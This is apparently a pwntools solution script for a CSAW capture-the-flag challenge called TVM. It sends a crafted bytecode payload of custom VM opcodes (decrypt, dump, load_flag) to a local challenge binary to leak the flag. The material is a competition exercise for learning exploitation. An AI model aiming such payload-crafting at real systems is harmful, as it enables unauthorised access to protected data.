from pwn import *

r = process("./TVM")
#r = remote("pwn.chal.csaw.io", 1007)
#r.recvuntil("bytecode:")

load_flag = "\xd9"
dump = "\xdd"
decrypt = "\x7f"
mov = "\x88"
kbx = "\x0b"
movi = "\x89"

payload = decrypt
payload += dump
payload += load_flag
payload += dump

r.sendline(payload)
r.interactive()
